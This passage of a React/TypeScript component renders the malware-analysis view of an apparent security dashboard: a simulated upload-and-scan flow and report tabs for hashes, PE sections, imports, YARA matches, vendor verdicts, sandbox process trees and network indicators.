  activeReportId: string;
  setActiveReportId: (id: string) => void;
  onAddReport: (rep: (typeof FIXTURES.malwareReports)[0]) => void;
  onDeleteReport: (id: string) => void;
  uploadModalOpen: boolean;
  setUploadModalOpen: (v: boolean) => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onPinIoc: (item: Omit<IOCClipboardItem, 'id' | 'addedAt'>) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
  userRole: UserRole;
}> = ({
  mainTab,
  subTab,
  setMainTab,
  setSubTab,
  reports,
  activeReportId,
  setActiveReportId,
  onAddReport,
  onDeleteReport,
  uploadModalOpen,
  setUploadModalOpen,
  onPivot,
  onPinIoc,
  onAddToast,
  userRole
}) => {
  const activeReport = useMemo(
    () => reports.find((r) => r.id === activeReportId) || reports[0],
    [reports, activeReportId]
  );

  // Upload & Scan Progress State
  const [uploadFilename, setUploadFilename] = useState('suspicious_invoice_oct.zip');
  const [onlineEnrich, setOnlineEnrich] = useState(true);
  const [offlineStatic, setOfflineStatic] = useState(true);
  const [zipPassword, setZipPassword] = useState('infected');
  const [scanning, setScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanStageIdx, setScanStageIdx] = useState(0);

  // Sub-tab local state
  const [stringsFilter, setStringsFilter] = useState('');
  const [expandedVendor, setExpandedVendor] = useState<string | null>(null);
  const [expandedPids, setExpandedPids] = useState<Record<number, boolean>>({ 4812: true, 5290: true, 6104: true });
  const [iocTypeFilter, setIocTypeFilter] = useState<string>('All');
  const [iocSearch, setIocSearch] = useState('');

  useEffect(() => {
    if (!scanning) return;
    const timer = setInterval(() => {
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(timer);
          setScanning(false);
          const newId = `mal-${Date.now().toString().slice(-4)}`;
          const cloned = {
            ...FIXTURES.malwareReports[0],
            id: newId,
            filename: uploadFilename || 'uploaded_sample.exe',
            timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC'
          };
          onAddReport(cloned);
          setActiveReportId(newId);
          setMainTab('investigation');
          setSubTab('dashboard');
          onAddToast({
            type: 'success',
            title: `Malware Scan Complete: ${cloned.filename}`,
            description: `Verdict: ${cloned.tier} (${cloned.score}/100) — ${cloned.detectionRatio}`
          });
          return 100;
        }
        const next = prev + 20;
        setScanStageIdx(Math.min(5, Math.floor((next / 100) * 6)));
        return next;
      });
    }, 320);
    return () => clearInterval(timer);
  }, [scanning, uploadFilename, onAddReport, setActiveReportId, setMainTab, setSubTab, onAddToast]);

  const startNewScan = () => {
    setUploadModalOpen(false);
    setMainTab('investigation');
    setScanProgress(10);
    setScanStageIdx(0);
    setScanning(true);
  };

  const filteredIocs = useMemo(() => {
    if (!activeReport) return [];
    return activeReport.iocs.filter((item) => {
      if (iocTypeFilter !== 'All' && item.type !== iocTypeFilter) return false;
      if (iocSearch && !item.value.toLowerCase().includes(iocSearch.toLowerCase()) && !item.context.toLowerCase().includes(iocSearch.toLowerCase())) {
        return false;
      }
      return true;
    });
  }, [activeReport, iocTypeFilter, iocSearch]);

  if (mainTab === 'overview') {
    return (
      <>
        <ToolOverviewTemplate
          tool={TOOLS_REGISTRY.malware}
          stats={[
            { label: 'Supported Binary Formats', value: 'PE · ELF · Mach-O · APK · Docs' },
            { label: 'Active YARA Ruleset', value: '812+ Signatures' },
            { label: 'Cloud Threat Feeds', value: 'VT · Hybrid · Triage · FileScan' },
            { label: 'Composite Scoring Budget', value: '0–100 (Rep / Sandbox / Static)' }
          ]}
          doesList={[
            'Dissects PE32/PE32+, ELF, Mach-O headers, section entropy, Authenticode signatures, and suspicious API imports.',
            'Executes 812+ curated YARA rules and extracts embedded URLs, C2 configurations, named pipes, and registry keys.',
            'Correlates cloud sandbox behavioral execution trees (process hollowing, shadow copy deletion, persistence) with MITRE ATT&CK.',
            'Allows one-click pivoting of extracted hashes, IPs, and domains directly into IOC Lookup and Event Analyzer.'
          ]}
          doesNotList={[
            'Does not detonate binaries directly on the analyst host OS — all dynamic behavioral telemetry comes from isolated sandboxes.',
            'Does not upload files to external cloud vendors when "Online enrichment" is unchecked during air-gapped analysis.'
          ]}
          terminalTitle="secconflux-malware-engine --inspect invoice_q3.exe --json"
          terminalOutput={`{\n  "sample": "invoice_q3.exe",\n  "sha256": "a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b",\n  "composite_score": 87,\n  "risk_tier": "CRITICAL",\n  "score_breakdown": { "reputation": "23/25", "sandbox": "31/35", "static": "33/40" },\n  "yara_matches": ["MAL_CobaltStrike_Beacon_Loader_x64", "APT_Process_Hollowing_Imports"],\n  "extracted_c2": "https://198.51.100.45:443/api/v2/telemetry/checkin"\n}`}
          ctaLabel="Start Scanning →"
          onStart={() => {
            setMainTab('investigation');
            setSubTab('dashboard');
          }}
        />
        <Modal
          open={uploadModalOpen}
          title="🔬 New Malware Analysis Scan"
          subtitle="Upload a binary, document, script, or password-protected archive (Max 50 MB)"
          onClose={() => setUploadModalOpen(false)}
        >
          {renderUploadModalContent()}
        </Modal>
      </>
    );
  }

  function renderUploadModalContent() {
    const isZip = uploadFilename.toLowerCase().endsWith('.zip');
    return (
      <div className="space-y-4">
        <div
          className="p-6 rounded-xl border-2 border-dashed text-center space-y-2"
          style={{ borderColor: 'var(--color-border-focus)', backgroundColor: 'var(--color-canvas)' }}
        >
          <div className="text-2xl">🔬</div>
          <div className="text-sm font-semibold">Drop a file or select sample filename to dissect</div>
          <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
            Supports PE, ELF, Mach-O, APK, Office docs, PDFs, scripts, archives (ZIP) · Maximum file size: 50 MB
          </div>
          <div className="pt-2 max-w-sm mx-auto">
            <input
              type="text"
              value={uploadFilename}
              onChange={(e) => setUploadFilename(e.target.value)}
              className="w-full px-3 py-1.5 rounded-lg text-xs sc-mono border text-center"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              aria-label="Sample filename"
            />
          </div>
        </div>

        <div className="space-y-2.5 text-xs">
          <label className="flex items-center gap-2.5 cursor-pointer">
            <input
              type="checkbox"
              checked={onlineEnrich}
              onChange={(e) => setOnlineEnrich(e.target.checked)}
              className="accent-indigo-500"
            />
            <span>Online enrichment (VirusTotal, Hybrid Analysis, Triage, FileScan)</span>
          </label>
          <label className="flex items-center gap-2.5 opacity-90">
            <input type="checkbox" checked={offlineStatic} onChange={() => setOfflineStatic(true)} disabled className="accent-indigo-500" />
            <span>Offline static analysis (YARA, PE headers, strings — always enabled)</span>
          </label>

          {isZip && (
            <div className="pt-2">
              <label className="block text-xs font-semibold mb-1" style={{ color: 'var(--color-text-secondary)' }}>
                🔑 ZIP Archive Password (detected .zip container)
              </label>
              <input
                type="text"
                value={zipPassword}
                onChange={(e) => setZipPassword(e.target.value)}
                className="w-full px-3 py-1.5 rounded-lg text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
            </div>
          )}
        </div>

        <div className="flex items-center justify-end gap-2 pt-3 border-t" style={{ borderColor: 'var(--color-border)' }}>
          <button
            type="button"
            onClick={() => setUploadModalOpen(false)}
            className="px-4 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
            style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={startNewScan}
            disabled={userRole === 'Viewer'}
            data-role="analyst-or-admin"
            className="px-4 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            Analyze Sample →
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-5 max-w-7xl mx-auto pb-12">
      {/* Contextual Action Bar */}
      <div className="rounded-xl p-3.5 sc-surface flex flex-wrap items-center justify-between gap-3">
        <div className="flex flex-wrap items-center gap-2.5">
          <span className="text-xs font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
            Active Report:
          </span>
          <select
            value={activeReport.id}
            onChange={(e) => setActiveReportId(e.target.value)}
            className="px-3 py-1.5 rounded-lg text-xs font-semibold sc-mono border"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            aria-label="Select Malware Report"
          >
            {reports.map((r) => (
              <option key={r.id} value={r.id}>
                {r.filename} — {r.tier} ({r.score}/100) · {r.timestamp}
              </option>
            ))}
          </select>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <button
            type="button"
            onClick={() => setUploadModalOpen(true)}
            disabled={userRole === 'Viewer'}
            data-role="analyst-or-admin"
            className="px-3.5 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            + New Scan
          </button>
          <button
            type="button"
            onClick={() => {
              downloadFileBlob(`${activeReport.filename}-report.json`, JSON.stringify(activeReport, null, 2));
              onAddToast({ type: 'success', title: 'Exported Malware Report JSON', description: `${activeReport.filename}-report.json downloaded.` });
            }}
            className="px-3 py-1.5 rounded-lg text-xs font-medium border hover:opacity-85 cursor-pointer"
            style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          >
            ⬇ Export JSON
          </button>
          <button
            type="button"
            onClick={() => {
              if (reports.length <= 1) {
                onAddToast({ type: 'warning', title: 'Cannot Delete Last Report', description: 'At least one baseline report is retained in demo state.' });
                return;
              }
              onDeleteReport(activeReport.id);
              onAddToast({ type: 'info', title: 'Scan Deleted', description: `Removed ${activeReport.filename} from history.` });
            }}
            disabled={userRole === 'Viewer'}
            data-role="analyst-or-admin"
            className="px-3 py-1.5 rounded-lg text-xs font-medium border border-red-500/40 text-red-400 hover:bg-red-500/10 cursor-pointer disabled:opacity-40"
          >
            Delete
          </button>
        </div>
      </div>

      {/* 8.4 Live Scan Progress View */}
      {scanning && (
        <div className="rounded-xl p-8 sc-surface text-center space-y-6">
          <div className="flex flex-col items-center gap-3">
            <ScoreRing score={scanProgress} max={100} size={120} label="SCANNING" />
            <h3 className="text-base font-bold">Dissecting {uploadFilename}...</h3>
            <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
              Active Stage: <strong style={{ color: 'var(--accent-from)' }}>{MALWARE_STAGES[scanStageIdx]}</strong>
            </p>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-6 gap-2 max-w-3xl mx-auto">
            {MALWARE_STAGES.map((stg, idx) => {
              const done = idx < scanStageIdx;
              const current = idx === scanStageIdx;
              return (
                <div
                  key={stg}
                  className="p-2.5 rounded-lg border text-xs flex flex-col items-center gap-1.5"
                  style={{
                    backgroundColor: current ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                    borderColor: current ? 'var(--color-border-focus)' : done ? 'var(--color-clean)' : 'var(--color-border)'
                  }}
                >
                  <span
                    className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${
                      done ? 'bg-emerald-500 text-black' : current ? 'sc-accent-bg text-white animate-pulse' : 'bg-gray-700 text-gray-300'
                    }`}
                  >
                    {done ? '✓' : idx + 1}
                  </span>
                  <span className="font-medium text-[11px]">{stg}</span>
                </div>
              );
            })}
          </div>

          <div className="max-w-xl mx-auto h-2.5 rounded-full overflow-hidden" style={{ backgroundColor: 'var(--color-canvas)' }}>
            <div className="h-full sc-accent-bg sc-candy-stripe transition-all duration-300" style={{ width: `${scanProgress}%` }} />
          </div>

          <button
            type="button"
            onClick={() => {
              setScanning(false);
              onAddToast({ type: 'warning', title: 'Scan Cancelled', description: 'Aborted active binary analysis pipeline.' });
            }}
            className="px-4 py-1.5 rounded-lg text-xs font-semibold border border-red-500/40 text-red-400 hover:bg-red-500/10 cursor-pointer"
          >
            Cancel Scan
          </button>
        </div>
      )}

      {/* 8.5 Sub-Tab: Dashboard */}
      {!scanning && subTab === 'dashboard' && (
        <div className="space-y-5">
          {/* Verdict Banner */}
          <div className="rounded-xl p-5 sc-surface sc-glow flex flex-col lg:flex-row lg:items-center justify-between gap-5">
            <div className="flex items-center gap-4">
              <ScoreRing score={activeReport.score} max={100} size={84} label={activeReport.tier} />
              <div className="space-y-1.5">
                <div className="flex flex-wrap items-center gap-2">
                  <VerdictBadge verdict={activeReport.verdict} label={`RISK TIER: ${activeReport.tier}`} size="md" />
                  <span className="sc-mono text-xs px-2.5 py-0.5 rounded border" style={{ borderColor: 'var(--color-border)' }}>
                    {activeReport.format}
                  </span>
                  <span className="sc-mono text-xs px-2.5 py-0.5 rounded bg-red-500/15 text-red-400 font-semibold">
                    {activeReport.detectionRatio}
                  </span>
                </div>
                <h2 className="text-xl font-bold sc-mono">{activeReport.filename}</h2>
                <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                  Size: {activeReport.size} · Scanned: {activeReport.timestamp}
                </div>
              </div>
            </div>

            <div className="flex flex-wrap gap-1.5">
              {activeReport.mitre.map((m) => (
                <a
                  key={m.id}
                  href={m.url}
                  target="_blank"
                  rel="noreferrer"
                  className="px-2.5 py-1 rounded-md text-xs sc-mono border hover:opacity-90 flex items-center gap-1.5"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--accent-from)' }}
                >
                  <span className="font-bold">{m.id}</span>
                  <span style={{ color: 'var(--color-text-secondary)' }}>{m.name}</span>
                </a>
              ))}
            </div>
          </div>

          {/* File Identification 2-Column PanelGrid */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Cryptographic File Identification
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="space-y-2">
                <CopyKV
                  label="MD5"
                  value={activeReport.md5}
                  onCopy={(v) => {
                    copyTextToClipboard(v);
                    onAddToast({ type: 'info', title: 'Copied MD5', description: v });
                  }}
                />
                <CopyKV
                  label="SHA-1"
                  value={activeReport.sha1}
                  onCopy={(v) => {
                    copyTextToClipboard(v);
                    onAddToast({ type: 'info', title: 'Copied SHA-1', description: v });
                  }}
                />
                <CopyKV
                  label="SHA-256"
                  value={activeReport.sha256}
                  onCopy={(v) => {
                    copyTextToClipboard(v);
                    onAddToast({ type: 'info', title: 'Copied SHA-256', description: v });
                  }}
                  onPivot={(v) =>
                    onPivot({
                      fromTool: 'malware',
                      fromLabel: `Malware scan: ${activeReport.filename}`,
                      fromMainTab: 'investigation',
                      fromSubTab: 'dashboard',
                      toTool: 'ioc',
                      toMainTab: 'lookup',
                      toSubTab: 'lookup',
                      indicatorValue: v,
                      indicatorType: 'SHA-256'
                    })
                  }
                  pivotLabel="Lookup Hash →"
                />
              </div>
              <div className="space-y-2">
                <CopyKV
                  label="SSDEEP"
                  value={activeReport.ssdeep}
                  onCopy={(v) => {
                    copyTextToClipboard(v);
                    onAddToast({ type: 'info', title: 'Copied SSDEEP', description: v });
                  }}
                />
                <CopyKV
                  label="ImpHash"
                  value={activeReport.imphash}
                  onCopy={(v) => {
                    copyTextToClipboard(v);
                    onAddToast({ type: 'info', title: 'Copied ImpHash', description: v });
                  }}
                />
                <CopyKV label="Magic Type" value={activeReport.magic} mono={false} />
              </div>
            </div>
          </div>

          {/* Analysis & Recommendations + Score Breakdown */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
            <div className="lg:col-span-7 rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Executive Analysis & Containment Recommendations
              </h3>
              <p className="text-xs leading-relaxed" style={{ color: 'var(--color-text-primary)' }}>
                {activeReport.summary}
              </p>
              <div className="space-y-2 pt-2">
                {activeReport.recommendations.map((rec, i) => (
                  <div
                    key={i}
                    className="p-3 rounded-lg border flex items-start gap-3 text-xs"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <VerdictBadge verdict={rec.priority} label={rec.priority} />
                    <span className="leading-relaxed">{rec.text}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="lg:col-span-5 rounded-xl p-5 sc-surface space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                  Score Breakdown ({activeReport.scoreBreakdown.formatName})
                </h3>
                <span className="sc-mono text-xs" style={{ color: 'var(--color-text-tertiary)' }}>
                  Budget: Rep 25 / Sandbox 35 / Static 40
                </span>
              </div>

              {[
                { label: 'Multi-Vendor Reputation', ...activeReport.scoreBreakdown.reputation, color: '#ef4444' },
                { label: 'Cloud Sandbox Behavioral', ...activeReport.scoreBreakdown.sandbox, color: '#f59e0b' },
                { label: 'Static YARA & Heuristics', ...activeReport.scoreBreakdown.static, color: '#6366f1' }
              ].map((bar) => {
                const pct = Math.round((bar.earned / bar.max) * 100);
                return (
                  <div key={bar.label} className="space-y-1.5">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-medium">{bar.label}</span>
                      <span className="sc-mono font-bold">
                        {bar.earned} / {bar.max} pts ({pct}%)
                      </span>
                    </div>
                    <div className="h-2.5 rounded-full overflow-hidden" style={{ backgroundColor: 'var(--color-canvas)' }}>
                      <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bar.color }} />
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {/* 8.6 Sub-Tab: Static Analysis */}
      {!scanning && subTab === 'static' && (
        <div className="space-y-5">
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Parsed Binary Headers ({activeReport.format})
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
              {Object.entries(activeReport.headers).map(([k, v]) => (
                <CopyKV key={k} label={k} value={v} />
              ))}
            </div>
          </div>

          {/* Sections Table */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              PE Sections & Entropy Distribution
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                    <th className="py-2.5 px-3">Section Name</th>
                    <th className="py-2.5 px-3">Virtual Size</th>
                    <th className="py-2.5 px-3">Raw Size</th>
                    <th className="py-2.5 px-3">Entropy (0–8)</th>
                    <th className="py-2.5 px-3">Characteristics</th>
                  </tr>
                </thead>
                <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                  {activeReport.sections.map((sec) => {
                    const highEnt = sec.entropy >= 7.2;
                    return (
                      <tr key={sec.name}>
                        <td className="py-2.5 px-3 sc-mono font-bold">{sec.name}</td>
                        <td className="py-2.5 px-3 sc-mono">{sec.vsize}</td>
                        <td className="py-2.5 px-3 sc-mono">{sec.rsize}</td>
                        <td className="py-2.5 px-3">
                          <div className="flex items-center gap-2">
                            <span className={`sc-mono font-bold ${highEnt ? 'text-red-400' : ''}`}>{sec.entropy.toFixed(2)}</span>
                            <div className="w-24 h-2 rounded-full overflow-hidden" style={{ backgroundColor: 'var(--color-canvas)' }}>
                              <div
                                className="h-full rounded-full"
                                style={{
                                  width: `${(sec.entropy / 8) * 100}%`,
                                  backgroundColor: highEnt ? 'var(--color-malicious)' : 'var(--color-clean)'
                                }}
                              />
                            </div>
                          </div>
                        </td>
                        <td className="py-2.5 px-3 sc-mono text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                          {sec.flags}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Imports & YARA Matches */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            <div className="rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Imported DLLs & Suspicious API Calls
              </h3>
              {activeReport.imports.length === 0 ? (
                <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                  No suspicious imports flagged.
                </div>
              ) : (
                <div className="space-y-3">
                  {activeReport.imports.map((imp) => (
                    <div
                      key={imp.dll}
                      className="p-3 rounded-lg border space-y-2"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                    >
                      <div className="sc-mono text-xs font-bold">{imp.dll}</div>
                      <div className="space-y-1.5">
                        {imp.apis.map((api) => (
                          <div key={api.name} className="flex items-center justify-between text-xs gap-2">
                            <span className={`sc-mono font-semibold ${api.suspicious ? 'text-red-400' : ''}`}>
                              {api.suspicious ? '🚨 ' : '• '}
                              {api.name}
                            </span>
                            <span className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                              {api.reason}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                YARA Rule Detections ({activeReport.yaraMatches.length})
              </h3>
              {activeReport.yaraMatches.length === 0 ? (
                <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                  Zero YARA rules matched on this sample.
                </div>
              ) : (
                <div className="space-y-3">
                  {activeReport.yaraMatches.map((ym) => (
                    <div
                      key={ym.rule}
                      className="p-3.5 rounded-lg border space-y-2"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                    >
                      <div className="flex items-center justify-between gap-2">
                        <span className="sc-mono text-xs font-bold">{ym.rule}</span>
                        <VerdictBadge verdict={ym.severity} label={ym.severity} />
                      </div>
                      <div className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                        Ruleset Source: {ym.source}
                      </div>
                      <div className="p-2 rounded sc-mono text-[11px] space-y-1" style={{ backgroundColor: 'var(--color-canvas)' }}>
                        {ym.matchedStrings.map((s, idx) => (
                          <div key={idx} className="truncate">
                            {s}
                          </div>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Extracted Strings Sample */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Extracted High-Signal Strings
              </h3>
              <input
                type="text"
                value={stringsFilter}
                onChange={(e) => setStringsFilter(e.target.value)}
                placeholder="Filter extracted strings..."
                className="px-3 py-1 rounded-lg text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
            </div>
            <pre
              className="p-4 rounded-lg sc-mono text-xs overflow-x-auto max-h-60 leading-relaxed"
              style={{ backgroundColor: 'var(--color-canvas)', color: 'var(--color-text-primary)' }}
            >
              {activeReport.stringsSample
                .filter((s) => s.toLowerCase().includes(stringsFilter.toLowerCase()))
                .join('\n') || 'No matching strings.'}
            </pre>
          </div>
        </div>
      )}

      {/* 8.7 Sub-Tab: Threat Intel */}
      {!scanning && subTab === 'threatintel' && (
        <div className="space-y-5">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {activeReport.vendors.map((v) => {
              const isOpen = expandedVendor === v.name;
              return (
                <div key={v.name} className="rounded-xl p-5 sc-surface space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-sm font-bold">{v.name}</h4>
                      <div className="sc-mono text-xs mt-0.5" style={{ color: 'var(--color-text-secondary)' }}>
                        Classification: {v.classification}
                      </div>
                    </div>
                    <VerdictBadge verdict={activeReport.verdict} label={v.status} />
                  </div>
                  <div className="flex items-center justify-between text-xs">
                    <span style={{ color: 'var(--color-text-secondary)' }}>Vendor Confidence: {v.confidence}%</span>
                    <button
                      type="button"
                      onClick={() => setExpandedVendor(isOpen ? null : v.name)}
                      className="text-xs font-semibold hover:underline cursor-pointer"
                      style={{ color: 'var(--accent-from)' }}
                    >
                      {isOpen ? 'Hide Raw JSON ▲' : 'View Raw JSON Payload ▼'}
                    </button>
                  </div>
                  {isOpen && (
                    <pre
                      className="p-3 rounded-lg sc-mono text-[11px] overflow-x-auto"
                      style={{ backgroundColor: 'var(--color-canvas)' }}
                    >
                      {v.rawJson}
                    </pre>
                  )}
                </div>
              );
            })}
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            <div className="rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Cloud Sandbox Behavioral Signatures
              </h3>
              {activeReport.sandboxSignatures.map((sig, i) => (
                <div
                  key={i}
                  className="p-3 rounded-lg border flex items-center justify-between gap-2 text-xs"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div>
                    <div className="font-semibold">{sig.title}</div>
                    <div className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                      Category: {sig.category}
                    </div>
                  </div>
                  <VerdictBadge verdict={sig.severity} label={sig.severity} />
                </div>
              ))}
            </div>

            <div className="rounded-xl p-5 sc-surface space-y-3">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                VirusTotal Community Intelligence Comments
              </h3>
              {activeReport.communityComments.length === 0 ? (
                <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                  No community comments recorded.
                </div>
              ) : (
                activeReport.communityComments.map((c, i) => (
                  <div
                    key={i}
                    className="p-3.5 rounded-lg border space-y-1 text-xs"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div className="flex items-center justify-between">
                      <span className="sc-mono font-bold" style={{ color: 'var(--accent-from)' }}>
                        {c.author}
                      </span>
                      <span style={{ color: 'var(--color-text-tertiary)' }}>{c.date}</span>
                    </div>
                    <p style={{ color: 'var(--color-text-primary)' }}>{c.body}</p>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* 8.8 Sub-Tab: Behavioral */}
      {!scanning && subTab === 'behavioral' && (
        <div className="space-y-5">
          {/* Interactive Process Tree */}
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Interactive Sandbox Process Execution Tree
            </h3>
            <div className="space-y-2">
              {activeReport.processTree.map((rootNode) => {
                const renderProc = (node: any, depth = 0): React.ReactNode => {
                  const isExp = !!expandedPids[node.pid];
                  return (
                    <div key={node.pid} className="space-y-2" style={{ marginLeft: depth * 24 }}>
                      <div
                        className="p-3 rounded-lg border space-y-1.5"
                        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
                      >
                        <div className="flex flex-wrap items-center justify-between gap-2">
                          <div className="flex items-center gap-2">
                            <button
                              type="button"
                              onClick={() => setExpandedPids({ ...expandedPids, [node.pid]: !isExp })}
                              className="w-5 h-5 rounded flex items-center justify-center text-xs border cursor-pointer"
                              style={{ borderColor: 'var(--color-border)' }}
                            >
                              {isExp ? '−' : '+'}
                            </button>
                            <span className="sc-mono text-xs font-bold">{node.name}</span>
                            <span className="sc-mono text-[11px] px-1.5 py-0.5 rounded bg-indigo-500/15 text-indigo-300">
                              PID {node.pid} (PPID {node.ppid})
                            </span>
                            <span className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                              User: {node.user}
                            </span>
                          </div>
                          <VerdictBadge verdict={node.risk} label={node.risk} />
                        </div>
                        <div className="sc-mono text-[11px] p-2 rounded overflow-x-auto" style={{ backgroundColor: 'var(--color-canvas)' }}>
                          {node.cmd}
                        </div>
                        {isExp && (
                          <div className="text-xs pt-1" style={{ color: 'var(--color-text-secondary)' }}>
                            Behavioral Note: {node.details}
                          </div>
                        )}
                      </div>
                      {node.children && node.children.map((ch: any) => renderProc(ch, depth + 1))}
                    </div>
                  );
                };
                return renderProc(rootNode, 0);
              })}
            </div>
          </div>

          {/* Network, Filesystem, Registry Tables */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            <div className="rounded-xl p-4 sc-surface space-y-2.5">
              <h4 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Network Activity ({activeReport.networkActivity.length})
              </h4>
              {activeReport.networkActivity.map((net, i) => (
                <div
                  key={i}
                  className="p-2.5 rounded-lg border text-xs space-y-1"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="flex items-center justify-between sc-mono font-bold">
                    <span>
                      {net.protocol} → {net.dstIp}:{net.dstPort}
                    </span>
                    <button
                      type="button"
                      onClick={() =>
                        onPivot({
                          fromTool: 'malware',
                          fromLabel: `Malware Behavioral: ${activeReport.filename}`,
                          fromMainTab: 'investigation',
                          fromSubTab: 'behavioral',
                          toTool: 'ioc',
                          toMainTab: 'lookup',
                          toSubTab: 'lookup',
                          indicatorValue: net.dstIp,
                          indicatorType: 'IP'
                        })
                      }
                      className="text-[10px] underline cursor-pointer"
                      style={{ color: 'var(--accent-from)' }}
                    >
                      Pivot IP →
                    </button>
                  </div>
                  <div className="sc-mono text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                    Host: {net.domain} · {net.bytes} · {net.process}
                  </div>
                </div>
              ))}
            </div>

            <div className="rounded-xl p-4 sc-surface space-y-2.5">
              <h4 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
